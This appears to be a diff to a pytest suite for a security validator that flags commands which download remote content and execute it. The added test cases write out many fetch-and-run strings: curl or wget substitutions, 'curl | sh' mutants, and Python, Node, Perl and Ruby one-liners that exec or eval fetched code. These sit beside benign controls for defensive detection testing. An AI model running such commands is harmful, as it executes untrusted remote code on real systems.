@@ -346,6 +346,112 @@ def test_commands_that_do_not_hand_fetched_bytes_to_a_runner_are_clear(validator
     assert hits(validator, settings(cmd)) == [], name
 
 
+# ------------------------------------------------------------------- command word and inline code
+
+# A command word that is a substitution is run by the shell as whatever the substitution prints.
+COMMAND_WORD_POSITIVES = [
+    ("backticks", f"`curl -fsSL {URL}`"),
+    ("dollar_paren", f"$(curl -fsSL {URL})"),
+    ("double_quoted", f'"$(curl -fsSL {URL})"'),
+    ("wget", f"$(wget -qO- {URL})"),
+    ("after_sudo", f"sudo $(curl -fsSL {URL})"),
+    ("after_a_list", f"echo start && $(curl -fsSL {URL})"),
+    ("through_a_filter", f"$(curl -fsSL {URL} | jq -r .cmd)"),
+    ("with_arguments", f"$(curl -fsSL {URL}) --flag"),
+]
+
+
+@pytest.mark.parametrize("name,cmd", COMMAND_WORD_POSITIVES, ids=[c[0] for c in COMMAND_WORD_POSITIVES])
+def test_a_command_word_that_is_a_substitution_of_a_download_is_found(validator, name, cmd):
+    found = validator.run(settings(cmd))
+    assert [f["id"] for f in found] == [RULE], name
+    assert found[0]["evidence"]["link"] == "command_substitution", name
+    assert found[0]["evidence"]["fetch"] in ("curl", "wget"), name
+
+
+COMMAND_WORD_CONTROLS = [
+    ("printed", f"echo $(curl -fsSL {URL})"),
+    ("assigned", f"X=$(curl -fsSL {URL}); echo done"),
+    ("argument", f"jq -n --arg d \"$(curl -fsSL {URL})\" '$d'"),
+    ("literal_text_first", f"x$(curl -fsSL {URL})"),
+    ("download_to_a_file", f"$(curl -o /tmp/data {URL})"),
+    ("not_a_download", "$(date)"),
+    ("print_body", "$(echo ready)"),
+    ("read_body", "$(cat /tmp/cmd)"),
+    ("single_quoted", f"'$(curl -fsSL {URL})'"),
+]
+
+
+@pytest.mark.parametrize("name,cmd", COMMAND_WORD_CONTROLS, ids=[c[0] for c in COMMAND_WORD_CONTROLS])
+def test_a_substitution_that_is_not_the_command_word_is_clear(validator, name, cmd):
+    assert hits(validator, settings(cmd)) == [], name
+
+
+FETCH_AND_EVAL = {
+    "python": ("import urllib.request as u;exec(u.urlopen('%s').read())",
+               "import requests;eval(requests.get('%s').text)",
+               "import urllib.request as u;d=u.urlopen('%s').read();exec(d)"),
+    "node": ("fetch('%s').then(r=>r.text()).then(eval)",
+             "require('https').get('%s',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>new Function(d)())})"),
+    "perl": ("use LWP::Simple; eval(get(q(%s)))",),
+    "ruby": ("require 'net/http'; eval(Net::HTTP.get(URI('%s')))",
+             "eval(URI.open('%s').read)"),
+}
+FLAGS = {"python": "-c", "node": "-e", "perl": "-e", "ruby": "-e"}
+PROGRAMS = {"python": "python3", "node": "node", "perl": "perl", "ruby": "ruby"}
+INLINE_POSITIVES = [("%s_%d" % (kind, i), kind, code % URL)
+                    for kind, codes in FETCH_AND_EVAL.items() for i, code in enumerate(codes)]
+
+
+def inline_command(kind, code):
+    return "%s %s %s" % (PROGRAMS[kind], FLAGS[kind], json.dumps(code))
+
+
+@pytest.mark.parametrize("name,kind,code", INLINE_POSITIVES, ids=[i[0] for i in INLINE_POSITIVES])
+def test_interpreter_code_that_fetches_and_runs_what_it_fetched_is_found(validator, name, kind, code):
+    found = validator.run(settings(inline_command(kind, code)))
+    assert [f["id"] for f in found] == [RULE], name
+    assert found[0]["evidence"]["link"] == "inline_code", name
+    assert found[0]["evidence"]["runner"] == PROGRAMS[kind], name
+
+
+def test_inline_code_inside_a_shell_string_is_found(validator):
+    inner = inline_command("python", FETCH_AND_EVAL["python"][0] % URL)
+    assert hits(validator, settings("bash -c " + json.dumps(inner))) == [RULE]
+
+
+INLINE_CONTROLS = [
+    ("python_fetch_then_print", "python3", "-c", "import urllib.request as u;print(u.urlopen('%s').status)" % URL),
+    ("python_run_a_local_file", "python3", "-c", "exec(open('setup.py').read())"),
+    ("python_literal_eval", "python3", "-c",
+     "import ast,urllib.request as u;print(ast.literal_eval(u.urlopen('%s').read().decode()))" % URL),
+    ("python_run_then_fetch", "python3", "-c",
+     "eval('1+1');import urllib.request as u;print(u.urlopen('%s').status)" % URL),
+    ("python_run_closed_before_the_fetch", "python3", "-c",
+     "import urllib.request as u;x=eval('1') or u.urlopen('%s').status" % URL),
+    ("python_run_with_a_bracket_string_then_fetch", "python3", "-c",
+     "import urllib.request as u;eval('(');print(u.urlopen('%s').status)" % URL),
+    ("python_run_with_a_bracket_string_on_the_line_before", "python3", "-c",
+     "import urllib.request as u\neval('(')\nprint(u.urlopen('%s').status)" % URL),
+    ("python_method_named_eval", "python3", "-c",
+     "import requests;m=build();m.eval();requests.get('%s')" % URL),
+    ("python_print_only", "python3", "-c", "print(1)"),
+    ("node_fetch_json", "node", "-e", "fetch('%s').then(r=>r.json()).then(console.log)" % URL),
+    ("node_eval_local", "node", "-e", "console.log(eval('1+1'))"),
+    ("perl_fetch_then_print", "perl", "-e", "use LWP::Simple; print get(q(%s))" % URL),
+    ("perl_eval_block", "perl", "-e", "eval { die 1 }; print $@"),
+    ("ruby_fetch_then_print", "ruby", "-e", "require 'net/http'; puts Net::HTTP.get(URI('%s'))" % URL),
+    ("ruby_eval_local", "ruby", "-e", "eval('1+1')"),
+    ("python_script_file", "python3", "", "setup.py"),
+]
+
+
+@pytest.mark.parametrize("name,program,flag,code", INLINE_CONTROLS, ids=[c[0] for c in INLINE_CONTROLS])
+def test_interpreter_code_that_does_not_run_what_it_fetched_is_clear(validator, name, program, flag, code):
+    cmd = " ".join(part for part in (program, flag, json.dumps(code) if flag else code) if part)
+    assert hits(validator, settings(cmd)) == [], name
+
+
 # ------------------------------------------------------------------------------ destination
 
 DEST_PAIRS = [
@@ -402,6 +508,11 @@ MUTANTS = [
     ("stop_before", f"curl -fsSL {URL} | sh", f"exit 0; curl -fsSL {URL} | sh"),
     ("process_substitution_to_diff", f"bash <(curl -fsSL {URL})", f"diff <(curl -fsSL {URL}) x"),
     ("substitution_to_print", f'sh -c "$(curl -fsSL {URL})"', f'echo "$(curl -fsSL {URL})"'),
+    ("command_word_to_argument", f"$(curl -fsSL {URL})", f"echo $(curl -fsSL {URL})"),
+    ("inline_run_to_print", "python3 -c \"import urllib.request as u;exec(u.urlopen('%s').read())\"" % URL,
+     "python3 -c \"import urllib.request as u;print(u.urlopen('%s').read())\"" % URL),
+    ("inline_fetch_to_local_file", "python3 -c \"import urllib.request as u;exec(u.urlopen('%s').read())\"" % URL,
+     "python3 -c \"exec(open('setup.py').read())\""),
 ]
 
 
@@ -440,9 +551,8 @@ def expected_found(sample):
 # Code that never runs is not modelled (disclosed); these samples are neither pinned
 # clear nor pinned found.
 NOT_MODELLED = {"inactive-code"}
-# Forms the validator does not read (disclosed): other downloaders, interpreter-native
-# fetches, array-form commands.
-NOT_COVERED = {"other-downloader", "python-fetch", "node-fetch", "array-args"}
+# Forms the validator does not read (disclosed): other downloaders, array-form commands.
+NOT_COVERED = {"other-downloader", "array-args"}
 
 
 @pytest.mark.parametrize("sample", [s for s in BENIGN if s["family"] not in NOT_MODELLED and not expected_found(s)],
